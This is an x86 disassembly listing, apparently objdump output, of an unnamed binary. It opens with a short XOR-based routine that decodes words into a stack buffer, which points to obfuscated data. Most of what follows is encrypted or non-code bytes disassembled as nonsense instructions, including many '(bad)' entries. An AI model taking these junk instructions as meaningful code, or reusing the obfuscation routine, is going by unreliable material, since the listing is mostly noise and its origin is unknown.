  410440:	jb     0x410435
  410446:	mov    edx,DWORD PTR [ebp-0x8]
  410449:	mov    eax,DWORD PTR [ebp-0xc]
  41044c:	xor    edx,ecx
  41044e:	add    edx,esi
  410450:	cmp    edx,eax
  410452:	je     0x410766
  410458:	push   ebx
  410459:	push   edi
  41045a:	mov    edi,DWORD PTR [ebp+0x8]
  41045d:	mov    eax,0x8a3c
  410462:	xor    ax,WORD PTR [edi+edx*4+0x2]
  410467:	mov    edi,0x3b02
  41046c:	add    ax,di
  41046f:	movzx  eax,ax
  410472:	mov    DWORD PTR [ebp-0x14],eax
  410475:	mov    eax,DWORD PTR [ebp+0x8]
  410478:	movzx  eax,WORD PTR [eax+edx*4]
  41047c:	xor    eax,0x8a3c
  410481:	add    eax,edi
  410483:	mov    edi,DWORD PTR [ebp-0x14]
  410486:	mov    BYTE PTR [ebp+edi*1-0x58],al
  41048a:	jmp    0x410758
  41048f:	cdq    
  410490:	outs   dx,BYTE PTR ds:[esi]
  410491:	mov    ds:0xa1f17118,eax
  410496:	outs   dx,DWORD PTR ds:[esi]
  410497:	or     BYTE PTR [edx],bl
  410499:	push   es
  41049a:	out    0x40,al
  41049c:	jl     0x410516
  41049e:	(bad)
  4104a1:	jle    0x410521
  4104a3:	scas   eax,DWORD PTR es:[edi]
  4104a4:	jl     0x410524
  4104a6:	jle    0x41049b
  4104a8:	jae    0x410492
  4104aa:	jo     0x410474
  4104ac:	retf   
  4104ad:	hlt    
  4104ae:	adc    al,0x6b
  4104b0:	mov    eax,ds:0xdd4dc099
  4104b5:	rcl    BYTE PTR [eax+0x26],1
  4104b8:	and    eax,0xdfbcb59d
  4104bd:	mov    esp,0x93703681
  4104c2:	sti    
  4104c3:	or     BYTE PTR [ecx-0x1f],ch
  4104c6:	mov    gs,WORD PTR [eax+0x25]
  4104c9:	loopne 0x41051e
  4104cb:	aaa    
  4104cc:	dec    esi
  4104cd:	(bad)  
  4104ce:	xor    al,dh
  4104d0:	mov    esi,DWORD PTR [edx*1-0x59c303ff]
  4104d7:	call   0xa2fe0ed7
  4104dc:	mov    cl,0x5f
  4104de:	mov    eax,DWORD PTR [ecx]
  4104e0:	pmaxub mm1,QWORD PTR [edx-0x6b]
  4104e4:	mov    ah,0x36
  4104e6:	scas   al,BYTE PTR es:[edi]
  4104e7:	pop    eax
  4104e8:	mov    edi,0x8f1ee416
  4104ed:	in     eax,dx
  4104ee:	dec    esi
  4104ef:	mov    WORD PTR [ecx-0x18],cs
  4104f2:	add    edi,esp
  4104f4:	pop    ds
  4104f5:	js     0x41055f
  4104f7:	push   0xcd6b2429
  4104fc:	inc    edi
  4104fd:	jb     0x4104a5
  4104ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410500:	mov    bl,0xb7
  410502:	mov    ebx,0xd56a5db7
  410507:	and    eax,0xe5988aac
  41050c:	sub    edx,esp
  41050e:	or     esp,DWORD PTR [ecx+0x25]
  410511:	mov    ds:0xaa6ffb23,al
  410516:	pop    edx
  410517:	iret   
  410518:	pmullw mm7,mm2
  41051b:	aad    0x14
  41051d:	xor    BYTE PTR [ebx-0x49],al
  410520:	pop    edi
  410521:	setbe  BYTE PTR [eax+0x2ca3df83]
  410528:	retf   0xb01f
  41052b:	xor    bh,dl
  41052d:	(bad)  
  41052f:	push   edx
  410530:	(bad)  
  410531:	jae    0x4104ec
  410533:	add    esi,0x7adfb2a7
  410539:	in     eax,0x33
  41053b:	cli    
  41053c:	add    al,0x1a
  41053e:	gs xchg ecx,eax
  410540:	mov    ebp,0x7d5e8a49
  410545:	loope  0x4104e0
  410547:	(bad)  
  410548:	int3   
  410549:	loop   0x4105ab
  41054b:	out    0xe6,eax
  41054d:	fldcw  WORD PTR [ecx]
  41054f:	cmp    BYTE PTR [edx],ah
  410551:	std    
  410552:	out    dx,eax
  410553:	scas   al,BYTE PTR es:[edi]
  410554:	repz pop esp
  410556:	sub    al,0xdb
  410558:	or     bl,cl
  41055a:	inc    eax
  41055b:	repz fnstcw WORD PTR [eax*1+0x535999a8]
  410563:	cmc    
  410564:	clc    
  410565:	loopne 0x4104f0
  410567:	or     DWORD PTR [esi+eax*1],edx
  41056a:	adc    dh,BYTE PTR ss:[ebx+0x73c247e3]
  410571:	jl     0x4105e0
  410573:	int    0xd9
  410575:	push   cs
  410576:	pushf  
  410577:	cli    
  410578:	stos   BYTE PTR es:[edi],al
  410579:	and    BYTE PTR [esi+ecx*4],bh
  41057c:	cdq    
  41057d:	dec    eax
  41057e:	shl    DWORD PTR [ebx+0x6b],0xb1
  410582:	shl    DWORD PTR [esi+0x141cef29],1
  410588:	jae    0x4105de
  41058a:	frstor [edi+eax*2-0x3ed90e47]
  410591:	xor    eax,0x89614e
  410596:	pop    ds
  410597:	jne    0x4105d1
  410599:	retf   0x5c6a
  41059c:	add    al,BYTE PTR [eax]
  41059e:	std    
  41059f:	ds inc ebp
  4105a1:	mov    bh,0xdc
  4105a3:	xor    eax,0xe4762c48
  4105a8:	pusha  
  4105a9:	lds    ecx,FWORD PTR [ebp+edi*1+0x3d8ff8fd]
  4105b0:	adc    bl,al
  4105b2:	mov    ds:0xb625b102,al
  4105b7:	stc    
  4105b8:	iret   
  4105b9:	das    
  4105ba:	cwde   
  4105bb:	stos   DWORD PTR es:[edi],eax
  4105bc:	cmp    dl,BYTE PTR [ebx-0x78]
  4105bf:	mov    ebp,0xa875a0f9
  4105c4:	lahf   
  4105c5:	je     0x410630
  4105c7:	cmp    eax,0x845f3a10
  4105cc:	lahf   
  4105cd:	pop    ss
  4105ce:	add    BYTE PTR [edi],ch
  4105d0:	int3   
  4105d1:	or     eax,0xe57c748e
  4105d6:	fisttp DWORD PTR [eax-0x4bbbc225]
  4105dc:	nop
  4105dd:	mov    bh,0xd6
  4105df:	push   0xd008724c
  4105e4:	in     eax,dx
  4105e5:	sbb    al,0x44
  4105e7:	push   ebx
  4105e8:	pop    ecx
  4105e9:	in     eax,0x29
  4105eb:	imul   BYTE PTR [ebx-0x63293431]
  4105f1:	mov    cl,0xb5
  4105f3:	mov    esp,DWORD PTR [ecx]
  4105f5:	push   ecx
  4105f6:	ins    BYTE PTR es:[edi],dx
  4105f7:	into   
  4105f8:	add    eax,0xf0b08af7
  4105fd:	cmp    DWORD PTR ds:0x93784c90,esp
  410603:	add    dh,BYTE PTR [ecx+0x72]
  410606:	ret    
  410607:	lock inc ebx
  410609:	adc    dl,BYTE PTR [ebx]
  41060b:	or     al,0x8f
  41060d:	mov    ebp,0xe0e253b0
  410612:	and    esp,DWORD PTR [edx+0x66]
  410615:	not    DWORD PTR [esi]
  410617:	cmp    BYTE PTR [si],cl
  41061a:	in     eax,0x77
  41061c:	test   al,0xf1
  41061e:	aam    0xf3
  410620:	xor    ebx,DWORD PTR [edi+0x1a]
  410623:	pop    edi
  410624:	jbe    0x4105f9
  410626:	pop    ebp
  410627:	pop    ebx
  410628:	add    ecx,DWORD PTR [ebp+0x5e]
  41062b:	out    0x1d,al
  41062d:	cmp    edi,DWORD PTR [esi-0x53]
  410630:	or     al,0x44
  410632:	aaa    
  410633:	or     al,0x17
  410635:	test   al,0x1b
  410637:	sub    esi,DWORD PTR [ebx]
  410639:	mov    cl,0x5a
  41063b:	add    DWORD PTR [eax+0xc4d8f3e],ebx
  410641:	bound  esp,QWORD PTR ds:0x7cdc7e29
  410647:	outs   dx,DWORD PTR ds:[esi]
  410648:	loope  0x410693
  41064a:	rcr    BYTE PTR [ebx],1
  41064c:	bound  ecx,QWORD PTR [ecx+0x247f2b03]
  410652:	gs inc ebx
  410654:	js     0x410625
  410656:	(bad)  
  410657:	mov    eax,0x900edcbe
  41065c:	push   0x60
  41065e:	pushf  
  41065f:	xchg   edi,eax
  410660:	cs pop es
  410662:	shr    cl,0x0
  410665:	adc    DWORD PTR [esi+0x24cf9763],eax
  41066b:	out    0xe9,al
  41066d:	test   al,0x16
  41066f:	mov    ds:0x1b86979d,al
  410674:	and    eax,ecx
  410676:	lahf   
  410677:	aad    0x75
  410679:	js     0x410666
  41067b:	popa   
  41067c:	aam    0x45
  41067e:	fwait
  41067f:	or     ecx,DWORD PTR [eax+0x32]
  410682:	call   0x7d03:0xa15443b6
  410689:	out    0xe5,al
  41068b:	lahf   
  41068c:	nop
  41068d:	lock mov al,ds:0x3c1bb9de
  410693:	ins    BYTE PTR es:[edi],dx
  410694:	push   cs
  410695:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410696:	jns    0x410663
  410698:	xchg   ecx,eax
  410699:	inc    edx
  41069a:	cmp    eax,0xdcde1378
  41069f:	sbb    al,0xc9
  4106a1:	mov    BYTE PTR [esi-0x79],bh
  4106a4:	sbb    BYTE PTR [eax+0x12],bl
  4106a7:	mov    ebx,DWORD PTR [esi-0xf]
  4106aa:	das    
  4106ab:	aam    0xd3
  4106ad:	outs   dx,BYTE PTR ds:[esi]
  4106ae:	retf   0x38c4
  4106b1:	cdq    
  4106b2:	xchg   eax,ebp
  4106b4:	aad    0x78
  4106b6:	add    eax,0xc4b64285
  4106bb:	jne    0x410651
  4106bd:	pop    esi
  4106be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106bf:	sti    
  4106c0:	xor    BYTE PTR [eax+0x668acd00],dh
  4106c6:	cmp    eax,0x896173b
  4106cb:	jmp    0xc7252bd
  4106d0:	pop    es
  4106d1:	lock mov fs,WORD PTR [ecx-0x4103734c]
  4106d8:	sbb    DWORD PTR [eax+0x77],ebp
  4106db:	dec    esp
  4106dc:	cmp    eax,ebp
  4106de:	fs ds aam 0x76
  4106e2:	mov    esi,0xd7a9a9b2
  4106e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106e8:	xor    bl,BYTE PTR [edx+0x57d41a3f]
  4106ee:	dec    ecx
  4106ef:	div    BYTE PTR [ebx]
  4106f1:	lea    ecx,[esi+edx*4-0x2ec9811d]
  4106f8:	jge    0x4106b1
  4106fa:	mov    gs,esp
  4106fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4106fd:	cmp    dl,BYTE PTR [eax+edx*4]
  410700:	or     eax,0xb0a9e85d
  410705:	aad    0xad
  410707:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410709:	call   0xd57585f3
  41070e:	arpl   bx,bp
  410710:	jo     0x4106ea
  410712:	cwde   
  410713:	hlt    
  410714:	ins    BYTE PTR es:[edi],dx
  410715:	test   al,0xf4
  410717:	in     al,dx
  410718:	pushf  
  410719:	fiadd  DWORD PTR [esi+edx*2+0x6b9c130c]
  410720:	in     al,dx
  410721:	pop    eax
  410722:	ds repnz ins BYTE PTR es:[edi],dx
  410725:	sbb    eax,ebx
  410727:	stc    
  410728:	(bad)  
  410729:	pushf  
  41072a:	xchg   esp,eax
  41072b:	pop    ebp
  41072c:	ins    BYTE PTR es:[edi],dx
  41072d:	dec    ebp
  41072e:	sub    al,0xbf
  410730:	in     al,dx
  410731:	add    bh,cl
  410733:	jecxz  0x4107af
  410735:	push   edi
  410736:	lea    edx,[ecx]
  410738:	mov    ds:0x96be0380,eax
  41073d:	shl    DWORD PTR [edx],1
  41073f:	cmp    esi,DWORD PTR [ebx]
  410741:	lds    ebx,FWORD PTR ds:0x3389cf0a
  410747:	shl    BYTE PTR [edx],1
  410749:	(bad)  
  41074b:	aam    0x8a
  41074d:	cld    
  41074e:	shr    al,1
  410750:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410751:	test   eax,0x43bd5b77
  410756:	jge    0x4107c6
  410758:	mov    eax,DWORD PTR [ebp-0xc]
  41075b:	inc    edx
  41075c:	cmp    edx,eax
  41075e:	jne    0x41045a
  410764:	pop    edi
  410765:	pop    ebx
  410766:	mov    eax,DWORD PTR [ebp-0x8]
  410769:	mov    edx,DWORD PTR [ebp+0x10]
  41076c:	xor    eax,ecx
  41076e:	jmp    0x410a3c
  410773:	mov    ds:0x6929ab51,eax
  410778:	icebp  
  410779:	mov    eax,ds:0x2251d751
  41077e:	and    eax,0x4c3ec61
  410783:	or     eax,0xaf7e7ebf
  410788:	jl     0x410808
  41078a:	jle    0x410734
  41078c:	cmp    eax,0xb006a50f
  410791:	or     ah,BYTE PTR [esi+0x41dfa977]
  410797:	stos   DWORD PTR es:[edi],eax
  410798:	or     al,0x74
  41079a:	push   edx
  41079b:	adc    eax,0x951bf200
  4107a0:	sub    eax,0x187dd8b1
  4107a5:	lds    ebx,FWORD PTR [edi+0x41332a04]
  4107ab:	fsub   st(4),st
  4107ad:	mov    edi,0x1a46add
  4107b2:	cli    
  4107b3:	adc    edi,DWORD PTR [ebx-0x7a]
  4107b6:	mov    eax,ds:0x5a1c74a
  4107bb:	pop    ds
  4107bc:	or     eax,0x61d56f8d
  4107c1:	xchg   esi,eax
  4107c2:	add    eax,0x5baddbb3
  4107c7:	jmp    0x4107e7
  4107c9:	call   FWORD PTR [edx]
  4107cb:	rcl    edx,1
  4107cd:	pop    es
  4107ce:	xchg   BYTE PTR [esi],ah
  4107d0:	adc    ebx,DWORD PTR [esi]
  4107d2:	call   0x5b67:0xde9544f0
  4107d9:	cwde   
  4107da:	cmp    BYTE PTR [ebp+0x7ee3544e],cl
  4107e0:	ins    DWORD PTR es:[edi],dx
  4107e1:	and    ebx,0x4b
  4107e4:	inc    edx
  4107e5:	and    cl,BYTE PTR [ecx+0x18d908c1]
  4107eb:	not    DWORD PTR [ecx+ebp*4+0x27]
  4107ef:	(bad)  
  4107f0:	cmp    eax,0x5a4ee8d0
  4107f5:	push   ecx
  4107f6:	mov    edi,0x57fafffa
  4107fb:	sub    dl,ah
  4107fd:	ficomp DWORD PTR [ebx+0x7c]
  410800:	sbb    eax,DWORD PTR [esi-0x7a]
  410803:	jp     0x410862
  410805:	inc    esp
  410806:	pop    esi
  410807:	out    dx,al
  410808:	cs inc ebx
  41080a:	mov    ebx,0x88d44987
  41080f:	fwait
  410810:	or     eax,0xb34975d
  410815:	(bad)  
  410818:	cmp    edi,DWORD PTR [ecx-0x65bd5db3]
  41081e:	cs mov ebp,0xa1dc518b
  410824:	retf   
  410825:	cmp    ebx,edx
  410827:	sti    
  410828:	ja     0x41082e
  41082a:	cld    
  41082b:	jmp    0x4107b6
  41082d:	mov    dl,0x73
  41082f:	xchg   esi,esi
  410831:	sbb    DWORD PTR [edx-0xc5befd7],esi
  410837:	mov    eax,0x52ea257
  41083c:	or     al,0xab
  41083e:	(bad)  
  41083f:	mov    bl,BYTE PTR [edi-0x7dad2788]
  410845:	retf   0x2fad
  410848:	add    DWORD PTR [ebp-0x4b834cd],edx
  41084e:	or     BYTE PTR [eax],ch
  410850:	call   0x2bc7214f
  410855:	pop    edi
  410856:	mov    dl,0x99
  410858:	stc    
  410859:	pop    esp
  41085a:	mov    edi,0xe73cfd4a
  41085f:	arpl   WORD PTR [ecx-0x4c],cx
  410862:	pop    edi
  410863:	pop    esi
  410864:	rcl    DWORD PTR [eax+ecx*1+0x23],1
  410868:	inc    ebx
  410869:	and    DWORD PTR [edx],ecx
  41086b:	xlat   BYTE PTR ds:[ebx]
  41086c:	pop    ecx
  41086d:	xor    al,0xc2
  41086f:	(bad)  
  410870:	adc    al,0x9a
  410872:	mov    ebp,DWORD PTR [eax-0x4a2d0b87]
  410878:	int    0xa6
  41087a:	iret   
  41087b:	sub    bh,BYTE PTR [ebx-0x1]
  41087e:	out    0xcc,eax
  410880:	jno    0x410839
  410882:	or     ebp,DWORD PTR [ebx+0x27f2439b]
  410888:	scas   al,BYTE PTR es:[edi]
  410889:	(bad)  
  41088a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41088b:	icebp  
  41088c:	aaa    
  41088d:	cmp    cl,BYTE PTR ds:0x7984c64e
  410893:	cmp    BYTE PTR [ecx],al
  410895:	clc    
  410896:	or     esp,DWORD PTR ds:0xc6d0622f
  41089c:	fwait
  41089d:	loop   0x41085d
  41089f:	jmp    0x11a5f1a8
  4108a4:	aaa    
  4108a5:	mov    ah,0x53
  4108a7:	mov    eax,ds:0xe2d1f182
  4108ac:	addr16 out 0x48,al
  4108af:	iret   
  4108b0:	retf   
  4108b1:	or     BYTE PTR [edi+eax*8],dh
  4108b4:	lods   al,BYTE PTR ds:[esi]
  4108b5:	dec    ebx
  4108b6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108b7:	inc    ebx
  4108b8:	sub    al,0x7e
  4108ba:	test   ebp,eax
  4108bc:	outs   dx,DWORD PTR ds:[esi]
  4108bd:	test   edi,ebp
  4108bf:	pop    ecx
  4108c0:	push   esp
  4108c1:	xchg   edi,eax
  4108c2:	or     eax,0x210c8d1
  4108c7:	mov    ds:0x26de8f5a,eax
  4108cc:	mov    edi,0x9de68128
  4108d1:	inc    ecx
  4108d2:	retf   0x704e
  4108d5:	sub    eax,0xc3a0ce6
  4108da:	sti    
  4108db:	mov    eax,edi
  4108dd:	in     al,dx
  4108de:	cmp    bh,BYTE PTR [ebx]
  4108e0:	dec    eax
  4108e1:	lds    ecx,FWORD PTR [eax+0x42]
  4108e4:	pop    ecx
  4108e5:	xchg   BYTE PTR [esi-0xc],dh
  4108e8:	pop    esi
  4108e9:	inc    DWORD PTR [esi]
  4108eb:	cld    
  4108ec:	call   0x1c41f849
  4108f1:	and    BYTE PTR [eax+0x33ff5d78],dl
  4108f7:	int    0xd7
  4108f9:	shl    BYTE PTR [ecx+0x5ef3bfed],0x72
  410900:	into   
  410901:	lock aas 
  410903:	mov    al,ds:0xfe85d153
  410908:	dec    ebp
  410909:	and    BYTE PTR [edi+esi*4+0x53],al
  41090d:	(bad)  
  41090e:	clc    
  41090f:	dec    ecx
  410910:	out    0xd5,eax
  410912:	out    0x16,al
  410914:	frstor [edi+0x1cfdca74]
  41091a:	mov    cl,ah
  41091c:	shr    DWORD PTR [esi-0x53],cl
  41091f:	loop   0x41096f
  410921:	call   FWORD PTR [esi-0x13d94622]
  410927:	add    cl,BYTE PTR [edx-0x5553b907]
  41092d:	lods   al,BYTE PTR ds:[esi]
  41092e:	stc    
  41092f:	mov    al,ds:0x636ed36a
  410934:	lock outs dx,DWORD PTR ds:[esi]
  410936:	cmp    ebp,DWORD PTR [edx-0x7f]
  410939:	push   ds
  41093a:	mov    dh,0xca
  41093c:	(bad)  
  41093d:	ins    BYTE PTR es:[edi],dx
  41093e:	lds    eax,FWORD PTR [edx+0x45118e68]
  410944:	shl    BYTE PTR [eax-0x1e],1
  410947:	mov    ecx,0xfa20ae44
  41094c:	xchg   edx,eax
  41094d:	cld    
  41094e:	or     DWORD PTR [ebp-0x14a82455],ecx
  410954:	call   0x83975dc5
  410959:	sub    esi,DWORD PTR [ebp-0x62caf87]
  41095f:	std    
  410960:	jno    0x4109c1
  410962:	(bad)  
  410963:	imul   edi,DWORD PTR [ecx-0x2b],0xffffff85
  410967:	mov    ds:0xdc61b390,al
  41096c:	imul   DWORD PTR [ebp-0x7130c869]
  410972:	inc    edi
  410973:	sub    esi,DWORD PTR [ebp+0x4f]
  410976:	nop
  410977:	jmp    0x612:0x2a4022e3
  41097e:	fidivr DWORD PTR [ebx]
  410980:	mov    ebx,0x4aae7dd4
  410985:	fld    st(3)
  410987:	and    DWORD PTR [esi+0x1b],edi
  41098a:	mov    eax,ds:0xcc36a599
  41098f:	push   eax
  410990:	(bad)  
  410991:	ss dec esi
  410993:	shl    DWORD PTR [esi+0x69],cl
  410996:	xor    DWORD PTR [ecx+edx*1],eax
  410999:	leave  
  41099a:	xor    ecx,DWORD PTR [eax+0x71]
  41099d:	sbb    eax,0x888de410
  4109a2:	sub    ah,ah
  4109a4:	push   eax
  4109a5:	pop    ds
  4109a6:	into   
  4109a7:	fidiv  WORD PTR [ecx+0x4a]
  4109aa:	je     0x4109d2
  4109ac:	cwde   
  4109ad:	jl     0x410a1f
  4109af:	push   ebp
  4109b0:	push   0x4e711374
  4109b5:	out    0xbd,eax
  4109b7:	mov    eax,ds:0x3afa1acc
  4109bc:	stc    
  4109bd:	jmp    0x410a25
  4109bf:	ret    
  4109c0:	int    0xf7
  4109c2:	pop    esp
  4109c3:	cmp    dh,dl
  4109c5:	(bad)  
  4109c6:	fld    TBYTE PTR [esi-0x4b]
  4109c9:	xchg   esp,eax
  4109ca:	aad    0x3d
  4109cc:	mov    dh,0x4e
  4109ce:	mov    ch,0xe3
  4109d0:	xor    ah,BYTE PTR [edx-0x6b]
  4109d3:	rol    edi,0x77
  4109d6:	aam    0x6b
  4109d8:	cmp    al,0xd1
  4109da:	xchg   ecx,eax
  4109db:	out    dx,eax
  4109dc:	retf   0x5958
  4109df:	sbb    DWORD PTR [esi+0x1],ebp
  4109e2:	add    cl,BYTE PTR [edi]
  4109e4:	push   ebx
  4109e5:	mov    ecx,0x7d22ec87
  4109ea:	pop    es
  4109eb:	rcl    BYTE PTR [edi+edx*1+0x69],1
  4109ef:	leave  
  4109f0:	mov    ecx,0x1564d680
  4109f5:	sub    DWORD PTR [eax+0x64],esp
  4109f8:	sbb    BYTE PTR [ecx],bl
  4109fa:	scas   eax,DWORD PTR es:[edi]
  4109fb:	jne    0x4109c2
  4109fd:	inc    ebp
  4109fe:	xchg   ebx,eax
  4109ff:	out    0x65,eax
  410a01:	and    bl,BYTE PTR [eax]
  410a03:	(bad)
  410a06:	repz xchg esi,eax
  410a08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a09:	dec    esp
  410a0a:	cmp    ebp,0xfffffffd
  410a0d:	popa   
  410a0e:	dec    edi
  410a0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a10:	in     al,0xec
  410a12:	mov    al,ds:0x3e2f9224
  410a17:	ror    DWORD PTR [ebp-0x5e405897],0xb
  410a1e:	(bad)  
  410a20:	push   edx
  410a21:	in     eax,0xf6
  410a23:	mov    ecx,0xaa2ec7d6
  410a28:	mov    ebx,DWORD PTR [esi]
  410a2a:	aas    
  410a2b:	xchg   esp,eax
  410a2c:	push   esp
  410a2d:	aam    0x5b
  410a2f:	xor    al,0xbb
  410a31:	adc    BYTE PTR [edx],al
  410a33:	mov    esp,0x4c5ad8ce
  410a38:	lock fs test eax,0xe9c6038e
  410a3f:	leave  
  410a40:	add    al,BYTE PTR [eax]
  410a42:	add    BYTE PTR [edx],al
  410a44:	xor    ah,BYTE PTR [esp+ebx*8+0x74]
  410a48:	push   0xc758f082
  410a4d:	xchg   esp,eax
  410a4e:	pop    esi
  410a4f:	add    BYTE PTR [esp+ebp*4+0x7ebdbab1],dl
  410a56:	jle    0x410a07
  410a58:	jl     0x410ad8
  410a5a:	jle    0x410a67
  410a5c:	shl    DWORD PTR [edx+0x30],0x51
  410a60:	jle    0x410a3a
  410a62:	jg     0x410a88
  410a64:	popf   
  410a65:	ret    
  410a66:	mov    bl,0x6a
  410a68:	outs   dx,BYTE PTR ds:[esi]
  410a69:	xchg   ch,dh
  410a6b:	retf   
  410a6c:	enter  0x79a7,0x81
  410a70:	jecxz  0x410a46
  410a72:	dec    ebx
  410a73:	jae    0x410a1e
  410a75:	js     0x410a9d
  410a77:	in     eax,0xa7
  410a79:	imul   eax,esp,0xffffffac
  410a7c:	imul   ebx,DWORD PTR [ebx+eiz*8-0x6a],0x6bac1101
  410a84:	(bad)  
  410a85:	test   eax,0xbef2d1b5
  410a8a:	pop    DWORD PTR [ecx-0x75]
  410a8d:	pop    eax
  410a8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410a8f:	test   al,0x96
  410a91:	and    cl,al
  410a93:	push   ss
  410a94:	loope  0x410a3d
  410a96:	int    0x17
  410a98:	push   eax
  410a99:	mov    eax,ds:0xeb2752cd
  410a9e:	out    0x93,al
  410aa0:	in     eax,dx
  410aa1:	aam    0x17
  410aa3:	inc    edi
  410aa4:	dec    ebp
  410aa5:	das    
  410aa6:	pushf  
  410aa7:	add    DWORD PTR [ecx+ecx*1-0x40193c8],edi
  410aae:	add    al,BYTE PTR [edi-0x1d]
  410ab1:	add    BYTE PTR ds:0x19b0225a,bh
  410ab7:	mov    al,ds:0x5f9274b5
  410abc:	ret    
  410abd:	cmp    DWORD PTR [esi+0x5f01869c],ebx
  410ac3:	pusha  
  410ac4:	jmp    0x410b23
  410ac6:	push   cs
  410ac7:	push   es
  410ac8:	mov    ds:0x4ba28e00,eax
  410acd:	loopne 0x410a91
  410acf:	jnp    0x410ab0
  410ad1:	icebp  
  410ad2:	mov    esp,0x4c402e12
  410ad7:	int    0x9f
  410ad9:	sbb    esp,DWORD PTR [eax-0x34]
  410adc:	jns    0x410b32
  410ade:	retf   
  410adf:	ret    
  410ae0:	scas   al,BYTE PTR es:[edi]
  410ae1:	cli    
  410ae2:	bound  ecx,QWORD PTR [eax-0x45]
  410ae5:	or     BYTE PTR [ebx-0x2e6aa0cf],bl
  410aeb:	stc    
  410aec:	dec    esp
  410aed:	js     0x410aa5
  410aef:	sbb    al,0xe2
  410af1:	stos   BYTE PTR es:[edi],al
  410af2:	les    edi,FWORD PTR [edi+0x39]
  410af5:	xor    BYTE PTR [eax-0x50b509ee],cl
  410afb:	dec    edi
  410afc:	inc    ecx
  410afd:	fstp   DWORD PTR [ebx+0x538953bd]
  410b03:	addr16 in al,0xfb
  410b06:	stc    
  410b07:	mov    ds:0xcbfa29f0,al
  410b0c:	push   ecx
  410b0d:	ret    
  410b0e:	(bad)  
  410b0f:	xchg   ebx,eax
  410b10:	mov    esi,0x7ba72b71
  410b15:	jb     0x410b40
  410b17:	sub    eax,0x850d5aa4
  410b1c:	mov    al,0x62
  410b1e:	out    dx,eax
  410b1f:	inc    esi
  410b20:	jge    0x410b02
  410b22:	sub    dh,ah
  410b24:	ds aaa 
  410b26:	ja     0x410ae2
  410b28:	out    dx,al
  410b29:	dec    esp
  410b2a:	loop   0x410b8a
  410b2c:	in     al,0x8c
  410b2e:	mov    fs,esi
  410b30:	add    dl,BYTE PTR [ebx+0xc]
  410b33:	jle    0x410aef
  410b35:	ret    
  410b36:	cmp    al,0x9f
  410b38:	arpl   WORD PTR [edx-0x11],dx
  410b3b:	sub    ebp,DWORD PTR ds:0xcf017a76
  410b41:	inc    esp
  410b42:	in     eax,dx
  410b43:	mov    ch,0xc5
  410b45:	inc    esp
  410b46:	ins    DWORD PTR es:[edi],dx
  410b47:	sbb    bh,BYTE PTR [esi]
  410b49:	sbb    dl,bh
  410b4b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410b4c:	je     0x410b4e
  410b4e:	pop    edx
  410b4f:	and    esi,ecx
  410b51:	push   esp
  410b52:	loop   0x410bb6
  410b54:	jmp    0xe03e62d5
  410b59:	cmp    eax,0xe139b58e
  410b5e:	inc    edx
  410b5f:	in     eax,0x37
  410b61:	or     edi,DWORD PTR [ecx+0x4c77d6bc]
  410b67:	or     BYTE PTR [eax+0x1bd57bd0],ch
  410b6d:	pop    edi
  410b6e:	and    BYTE PTR [edi+edx*2+0x7],ch
  410b72:	add    esi,0x4299888e
  410b78:	xchg   ecx,eax
  410b79:	ds xchg edi,eax
  410b7b:	mov    dh,0x96
  410b7d:	mov    cs,WORD PTR [eax+0x59ec439d]
  410b83:	out    dx,eax
  410b84:	pop    edi
  410b85:	fdivr  st(1),st
  410b87:	fistp  WORD PTR [ebp-0x35]
  410b8a:	enter  0x8421,0xfa
  410b8e:	mov    dh,ch
  410b90:	retf   
  410b91:	jmp    0xadd3:0xfbf9be84
  410b98:	cmp    BYTE PTR [ebx+0x268c25ed],dl
  410b9e:	push   0x477c5d53
  410ba3:	out    dx,al
  410ba4:	outs   dx,BYTE PTR ds:[esi]
  410ba5:	push   dx
  410ba7:	pop    ss
  410ba8:	stos   BYTE PTR es:[edi],al
  410ba9:	mov    bh,0x66
  410bab:	sub    esp,0xffffff8d
  410bae:	repz out 0xc0,eax
  410bb1:	sbb    BYTE PTR [ebx+edx*4],0xf8
  410bb5:	sbb    BYTE PTR [edi-0x5],0xc0
  410bb9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410bba:	cmp    BYTE PTR [ebx],0xb5
  410bbd:	cs or  bl,bl
  410bc0:	jns    0x410c22
  410bc2:	test   DWORD PTR [edi+0x283ec2e9],edx
  410bc8:	jg     0x410c36
  410bca:	(bad)  
  410bcb:	ficom  DWORD PTR [esi+edx*4-0x73]
  410bcf:	aad    0x85
  410bd1:	mov    edx,0xb3f47dc9
  410bd6:	add    ah,ch
  410bd8:	cmp    dh,BYTE PTR [ecx-0x85322ec]
  410bde:	pop    edi
  410bdf:	push   esp
  410be0:	cmp    esp,esi
  410be2:	sbb    BYTE PTR [ebx-0x6f61329],dl
  410be8:	dec    edi
  410be9:	or     bh,BYTE PTR [eax-0x6c981b0a]
  410bef:	push   edi
  410bf0:	(bad)  
  410bf1:	or     al,0x6b
  410bf3:	imul   ebx,DWORD PTR [ecx+0x7d31499d],0xffffffef
  410bfa:	jge    0x410bf1
  410bfc:	iret   
  410bfd:	dec    ecx
  410bfe:	ror    DWORD PTR [edi+ebx*8],cl
  410c01:	push   es
  410c02:	mov    ds:0x7e29ef7,eax
  410c07:	ficomp DWORD PTR ds:0xcea88f07
  410c0d:	pop    eax
  410c0e:	push   ecx
  410c0f:	cmp    BYTE PTR [eax-0x4e],dh
  410c12:	repnz inc esp
  410c14:	(bad)  
  410c16:	push   es
  410c17:	out    dx,al
  410c18:	jmp    0xfe57:0x41ed4871
  410c1f:	stos   BYTE PTR es:[edi],al
  410c20:	add    eax,0xe2f35ee8
  410c25:	xlat   BYTE PTR ds:[ebx]
  410c26:	inc    DWORD PTR [esi]
  410c28:	dec    esp
  410c29:	inc    esp
  410c2a:	inc    ebp
  410c2b:	out    0xc6,eax
  410c2d:	jecxz  0x410c63
  410c2f:	pop    edi
